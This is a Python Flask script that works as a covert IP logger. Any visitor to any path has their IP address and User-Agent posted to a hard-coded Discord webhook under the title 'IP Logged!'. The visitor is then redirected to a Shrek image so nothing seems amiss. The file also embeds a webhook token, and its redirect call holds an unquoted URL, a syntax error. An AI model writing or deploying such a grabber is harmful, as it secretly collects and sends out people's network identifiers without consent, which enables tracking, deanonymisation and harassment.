from flask import Flask, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1472623600799453337/FoETjKnj5OoXRzudvs9POWMEOQbVNicWdnomryDZEyfVq6-RbyykJgHwkbdP4KEh4uaS" 
IMAGE_URL = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" 

@app.route('/')
@app.route('/<path:path>')
def index(path=None):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    data = {
        "embeds": [{
            "title": "IP Logged!",
            "color": 16711680,
            "fields": [
                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "User Agent", "value": f"`{user_agent}`", "inline": False}
            ]
        }]
    }
    
    requests.post(WEBHOOK_URL, json=data)
    return redirect(https://www.google.com/imgres?q=shrek&imgurl=https%3A%2F%2Fwww.cinefilos.it%2Fwp-content%2Fuploads%2F2019%2F10%2Fshrek-trama.jpg&imgrefurl=https%3A%2F%2Fwww.cinefilos.it%2Ftutto-film%2Fapprofondimenti%2Fshrek-colonna-sonora-personaggi-sequel-414307&docid=Od0V2if9-tjwIM&tbnid=rcEuxl6HPWXh5M&vet=12ahUKEwia-MDE9NuSAxUBh_0HHdzeE1EQnPAOegQIGhAB..i&w=800&h=482&hcb=2&ved=2ahUKEwia-MDE9NuSAxUBh_0HHdzeE1EQnPAOegQIGhAB)

if __name__ == "__main__":
    app.run()
